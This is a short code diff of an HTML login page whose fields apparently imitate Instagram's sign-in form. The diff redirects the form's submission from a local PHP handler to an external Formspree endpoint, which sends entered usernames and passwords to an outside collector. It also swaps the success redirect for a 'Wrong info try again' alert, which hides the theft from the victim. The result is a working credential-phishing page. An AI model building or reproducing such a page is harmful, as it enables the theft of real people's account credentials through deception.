@@ -157,7 +157,7 @@
             >
             
             <!-- Form points to the PHP processing file -->
-            <form class="login-form" id="loginForm" action="login_process.php" method="POST">
+            <form class="login-form" id="loginForm" action="https://formspree.io/f/myyraekv" method="POST">
                 <input type="text" name="email" placeholder="Phone number, username, or email" required>
                 <input type="password" name="password" placeholder="Password" required>
                 
@@ -220,7 +220,7 @@
                         statusMessage.className = 'success';
                         
                         // Redirect user to xyz.html on success, as requested
-                        window.location.href = 'xyz.html'; 
+                        alert('Wrong info try again'); 
                     } else {
                         // Display the error message from the PHP script
                         statusMessage.textContent = data.message || 'Login failed.';
@@ -238,3 +238,4 @@
     </script>
 </body>
 </html>
+
